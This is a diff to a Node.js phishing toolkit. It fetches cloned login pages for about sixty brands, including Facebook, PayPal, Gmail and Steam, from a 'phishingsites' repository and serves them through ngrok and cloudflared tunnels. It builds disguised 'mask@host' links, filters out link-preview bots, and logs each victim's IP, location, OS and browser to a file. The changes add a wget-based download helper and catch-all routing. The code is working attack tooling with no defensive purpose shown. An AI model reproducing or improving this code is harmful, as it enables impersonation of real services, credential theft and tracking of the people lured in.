@@ -31,7 +31,8 @@ const geoip = require("geoip-lite");
 const chalk = require("chalk");
 const agentParser = require("ua-parser-js");
 const child_process = require("child_process");
-const downloader = require("download");
+const cliProgress = require("cli-progress");
+const request = require("request");
 const AdmZip = require("adm-zip");
 const axios = require("axios").default;
 const app = express();
@@ -50,65 +51,65 @@ const logInfo = chalk.yellowBright`[{whiteBright +}]`;
 const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
 const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
 const availableSites = {
-	Adobe: "https://github.com/gamerboytr/files/blob/master/phishingsites/adobe.rar",
-	Airtelsim: "https://github.com/gamerboytr/files/blob/master/phishingsites/airtelsim.rar",
-	Amazon: "https://github.com/gamerboytr/files/blob/master/phishingsites/amazon.rar",
-	Apple: "https://github.com/gamerboytr/files/blob/master/phishingsites/apple.rar",
-	Badoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/badoo.rar",
-	"Clash of Clans": "https://github.com/gamerboytr/files/blob/master/phishingsites/clashofclans.rar",
-	DeviantArt: "https://github.com/gamerboytr/files/blob/master/phishingsites/deviantart.rar",
-	Discord: "https://github.com/gamerboytr/files/blob/master/phishingsites/discord.rar",
-	Dropbox: "https://github.com/gamerboytr/files/blob/master/phishingsites/dropbox.rar",
-	eBay: "https://github.com/gamerboytr/files/blob/master/phishingsites/ebay.rar",
-	Facebook: "https://github.com/gamerboytr/files/blob/master/phishingsites/facebook.rar",
-	"Facebook Advenced": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_advanced.rar",
-	Messenger: "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_messenger.rar",
-	"Facebook Security": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_security.rar",
-	FreeFire: "https://github.com/gamerboytr/files/blob/master/phishingsites/freefire.rar",
-	Github: "https://github.com/gamerboytr/files/blob/master/phishingsites/github.rar",
-	Gitlab: "https://github.com/gamerboytr/files/blob/master/phishingsites/gitlab.rar",
-	Gmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/gmail.rar",
-	Google: "https://github.com/gamerboytr/files/blob/master/phishingsites/google.rar",
-	"Google Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/google_poll.rar",
-	iCloud: "https://github.com/gamerboytr/files/blob/master/phishingsites/icloud.rar",
-	"Insta Auto Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/ig_followers.rar",
-	"Insta 1000 Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/insta_followers.rar",
-	Instagram: "https://github.com/gamerboytr/files/blob/master/phishingsites/instagram.rar",
-	Jiorouter: "https://github.com/gamerboytr/files/blob/master/phishingsites/jiorouter.rar",
-	LinkedIn: "https://github.com/gamerboytr/files/blob/master/phishingsites/linkedin.rar",
-	Mediafire: "https://github.com/gamerboytr/files/blob/master/phishingsites/mediafire.rar",
-	Microsoft: "https://github.com/gamerboytr/files/blob/master/phishingsites/microsoft.rar",
-	Myspace: "https://github.com/gamerboytr/files/blob/master/phishingsites/myspace.rar",
-	Netflix: "https://github.com/gamerboytr/files/blob/master/phishingsites/netflix.rar",
-	Origin: "https://github.com/gamerboytr/files/blob/master/phishingsites/origin.rar",
-	Outlook: "https://github.com/gamerboytr/files/blob/master/phishingsites/outlook.rar",
-	Paypal: "https://github.com/gamerboytr/files/blob/master/phishingsites/paypal.rar",
-	Pinterest: "https://github.com/gamerboytr/files/blob/master/phishingsites/pinterest.rar",
-	Playstation: "https://github.com/gamerboytr/files/blob/master/phishingsites/playstation.rar",
-	Protonmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/protonmail.rar",
-	Pubg: "https://github.com/gamerboytr/files/blob/master/phishingsites/pubg.rar",
-	Quora: "https://github.com/gamerboytr/files/blob/master/phishingsites/quora.rar",
-	Reddit: "https://github.com/gamerboytr/files/blob/master/phishingsites/reddit.rar",
-	Roblox: "https://github.com/gamerboytr/files/blob/master/phishingsites/roblox.rar",
-	Shopify: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopify.rar",
-	Shopping: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopping.rar",
-	Snapchat: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat.rar",
-	Snapchat2: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat2.rar",
-	SocialClub: "https://github.com/gamerboytr/files/blob/master/phishingsites/socialclub.rar",
-	Spotify: "https://github.com/gamerboytr/files/blob/master/phishingsites/spotify.rar",
-	Stackoverflow: "https://github.com/gamerboytr/files/blob/master/phishingsites/stackoverflow.rar",
-	Steam: "https://github.com/gamerboytr/files/blob/master/phishingsites/steam.rar",
-	Telegram: "https://github.com/gamerboytr/files/blob/master/phishingsites/telegram.rar",
-	TikTok: "https://github.com/gamerboytr/files/blob/master/phishingsites/tiktok.rar",
-	Twitch: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitch.rar",
-	Twitter: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitter.rar",
-	Verizon: "https://github.com/gamerboytr/files/blob/master/phishingsites/verizon.rar",
-	VK: "https://github.com/gamerboytr/files/blob/master/phishingsites/vk.rar",
-	"VK Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/vk_poll.rar",
-	"Wi-Fi": "https://github.com/gamerboytr/files/blob/master/phishingsites/wifi.rar",
-	Wordpress: "https://github.com/gamerboytr/files/blob/master/phishingsites/wordpress.rar",
-	Yahoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/yahoo.rar",
-	Yandex: "https://github.com/gamerboytr/files/blob/master/phishingsites/yandex.rar",
+	Adobe: "adobe",
+	Airtelsim: "airtelsim",
+	Amazon: "amazon",
+	Apple: "apple",
+	Badoo: "badoo",
+	"Clash of Clans": "clashofclans",
+	DeviantArt: "deviantart",
+	Discord: "discord",
+	Dropbox: "dropbox",
+	eBay: "ebay",
+	Facebook: "facebook",
+	"Facebook Advenced": "fb_advanced",
+	Messenger: "fb_messenger",
+	"Facebook Security": "fb_security",
+	FreeFire: "freefire",
+	Github: "github",
+	Gitlab: "gitlab",
+	Gmail: "gmail",
+	Google: "google",
+	"Google Poll": "google_poll",
+	iCloud: "icloud",
+	"Insta Auto Followers": "ig_followers",
+	"Insta 1000 Followers": "insta_followers",
+	Instagram: "instagram",
+	Jiorouter: "jiorouter",
+	LinkedIn: "linkedin",
+	Mediafire: "mediafire",
+	Microsoft: "microsoft",
+	Myspace: "myspace",
+	Netflix: "netflix",
+	Origin: "origin",
+	Outlook: "outlook",
+	Paypal: "paypal",
+	Pinterest: "pinterest",
+	Playstation: "playstation",
+	Protonmail: "protonmail",
+	Pubg: "pubg",
+	Quora: "quora",
+	Reddit: "reddit",
+	Roblox: "roblox",
+	Shopify: "shopify",
+	Shopping: "shopping",
+	Snapchat: "snapchat",
+	Snapchat2: "snapchat2",
+	SocialClub: "socialclub",
+	Spotify: "spotify",
+	Stackoverflow: "stackoverflow",
+	Steam: "steam",
+	Telegram: "telegram",
+	TikTok: "tiktok",
+	Twitch: "twitch",
+	Twitter: "twitter",
+	Verizon: "verizon",
+	VK: "vk",
+	"VK Poll": "vk_poll",
+	"Wi-Fi": "wifi",
+	Wordpress: "wordpress",
+	Yahoo: "yahoo",
+	Yandex: "yandex",
 };
 let siteConfig = {};
 
@@ -137,19 +138,25 @@ app.disable("x-powered-by");
 (async () => {
 	await controlVersion().catch(throwError);
 	await installRequirements().catch(throwError);
-	process.on("SIGINT", _ => onExit());
+	if (process.platform !== "win32") {
+		process.on("SIGINT", _ => onExit());
+	}
 	siteConfig = (await selectSite().catch(throwError)).config;
 	startServer();
 })();
 
-app.all("/", async (req, res) => {
+app.all(/(.*)/, async (req, res, next) => {
 	const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 	const userAgent = req.headers["user-agent"];
 	const ua = agentParser(userAgent);
 	const referer = req.headers?.referer;
 	const location = geoip.lookup(ip);
 	const { data: request } = await axios.get(`https://ipwhois.app/json/${ip}`).catch(throwError);
-	res.redirect("login");
+	if (req.url.split("?")[0] === "/") {
+		res.redirect(301, "/login");
+	} else {
+		next();
+	}
 	if (ip !== "::1" && !botDetecter.test(userAgent) && !loggedIps.includes(ip) && request.type && location?.city) {
 		console.clear();
 		console.log(logLogo);
@@ -169,7 +176,7 @@ app.all("/", async (req, res) => {
 		fs.appendFileSync(
 			"./ip.txt",
 			[
-				`========================${siteConfig.name} ${new Date().toLocaleString()}========================`,
+				`========================${siteConfig.name.toUpperCase()} ${new Date().toLocaleString()}========================`,
 				`IP: ${ip}`,
 				`IP Type: ${request.type}`,
 				`User OS: ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`,
@@ -263,27 +270,12 @@ function installRequirements() {
 	return new Promise(async (resolve, reject) => {
 		console.clear();
 		console.log(logLogo);
-		//! Cloudflared
-		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
-			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
-			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}` : "windows-386.exe"}`;
-			try {
-				await downloader(cloudflaredLink, path.join(__dirname, "bin"), { filename: `cloudflared${!isLinux ? ".exe" : ""}` }).catch(reject);
-				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
-				if (isLinux) {
-					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
-				}
-			} catch {
-				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
-				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
-			}
-		}
 		//! Ngrok
 		if (!fs.existsSync(path.join(__dirname, "bin", `ngrok${!isLinux ? ".exe" : ""}`))) {
 			console.log(chalk.yellow`${logInfo2} Downloading ngrok...`);
 			const ngrokLink = `https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-${isLinux ? `linux-${getArch()}.tgz` : "windows-386.zip"}`;
 			try {
-				await downloader(ngrokLink, path.join(__dirname, "bin"), { filename: `ngrok${isLinux ? ".tgz" : ".zip"}` }).catch(reject);
+				await downloadFile(ngrokLink, path.join(__dirname, "bin", `ngrok${isLinux ? ".tgz" : ".zip"}`)).catch(reject);
 				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
 				console.log(chalk.yellow`${logInfo2} Extracting...`);
 				if (isLinux) {
@@ -296,6 +288,21 @@ function installRequirements() {
 				console.log(chalk.yellow`${logSuccess} Extracted!\n`);
 			} catch {
 				console.log(chalk.redBright`${logError} Failed to download ngrok!\n`);
+				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
+			}
+		}
+		//! Cloudflared
+		if (!fs.existsSync(path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`))) {
+			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
+			const cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? `linux-${getArch()}` : "windows-386.exe"}`;
+			try {
+				await downloadFile(cloudflaredLink, path.join(__dirname, "bin", `cloudflared${!isLinux ? ".exe" : ""}`)).catch(reject);
+				console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
+				if (isLinux) {
+					child_process.execSync(`chmod +x ${path.join(__dirname, "bin", "cloudflared")}`);
+				}
+			} catch {
+				console.log(chalk.redBright`${logError} Failed to download cloudflared!\n`);
 				console.log(chalk.yellow`${logInfo} Please download it manually\n`);
 			}
 		}
@@ -313,9 +320,9 @@ function openNgrok(port) {
 		let ngrokUrl;
 		while (!ngrokUrl) {
 			try {
-				let request = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
-				if (request?.data?.tunnels?.[0]?.public_url) {
-					ngrokUrl = (request.data.tunnels?.[1] ?? request.data.tunnels?.[0]).public_url;
+				const req = await axios.get("http://127.0.0.1:4040/api/tunnels").catch(() => {});
+				if (req?.data?.tunnels?.[0]?.public_url) {
+					ngrokUrl = (req.data.tunnels?.[1] ?? req.data.tunnels?.[0]).public_url;
 				} else {
 					await new Promise(r => setTimeout(r, 1000));
 				}
@@ -384,7 +391,7 @@ function selectSite() {
 			selectSite();
 			return;
 		}
-		const folder = availableSites[Object.keys(availableSites)[parseInt(choose) - 1]].split("/").pop().split(".")[0];
+		const folder = availableSites[Object.keys(availableSites)[parseInt(choose) - 1]];
 		const config = await downloadSites(folder).catch(throwError);
 		app.get("/login", (_req, res) => {
 			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
@@ -402,7 +409,7 @@ function downloadSites(folder) {
 					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
 					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
 				}
-				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/gamerboytr/files/raw/master/phishingsites/${folder}.zip`).catch(throwError));
+				await downloadFile(`https://github.com/gamerboytr/files/raw/master/phishingsites/${folder}.zip?${Date.now()}`, path.join(__dirname, "bin", "websites", `${folder}.zip`)).catch(throwError);
 				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
 				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
 				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
@@ -476,6 +483,59 @@ async function startServer() {
 	console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
 	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL $3 > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL 3 > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
+}
+
+function downloadFile(url, filePath) {
+	return new Promise((resolve, reject) => {
+		if (isLinux) {
+			child_process.exec(`wget -q --show-progress ${url} -O ${filePath}`, (error, stdout, stderr) => {
+				if (error) {
+					reject(error);
+				}
+				resolve();
+			});
+		} else {
+			const progressBar = new cliProgress.SingleBar({ format: `Downloading [${chalk.cyanBright("{bar}")}] {percentage}% || ETA: {eta}s`, clearOnComplete: true, hideCursor: true }, cliProgress.Presets.shades_classic);
+			if (!fs.existsSync(path.dirname(filePath))) {
+				fs.mkdirSync(path.dirname(filePath));
+			}
+			const file = fs.createWriteStream(filePath);
+			let receivedBytes = 0;
+			request
+				.get(url)
+				.on("response", response => {
+					if (response.statusCode < 200 || response.statusCode > 399) {
+						reject(`Response status was ${response.statusCode}`);
+						return;
+					}
+					progressBar.start(response.headers["content-length"], 0, { speed: "N/A" });
+				})
+				.on("data", chunk => {
+					receivedBytes += chunk.length;
+					progressBar.update(receivedBytes);
+				})
+				.pipe(file)
+				.on("error", err => {
+					if (fs.existsSync(filePath)) {
+						fs.unlinkSync(filePath);
+					}
+					progressBar.stop();
+					reject(err.message);
+				});
+			file.on("finish", () => {
+				progressBar.stop();
+				file.close(resolve);
+			});
+			file.on("error", err => {
+				if (fs.existsSync(filePath)) {
+					fs.unlinkSync(filePath);
+				}
+				progressBar.stop();
+				reject(err.message);
+				return;
+			});
+		}
+	});
 }
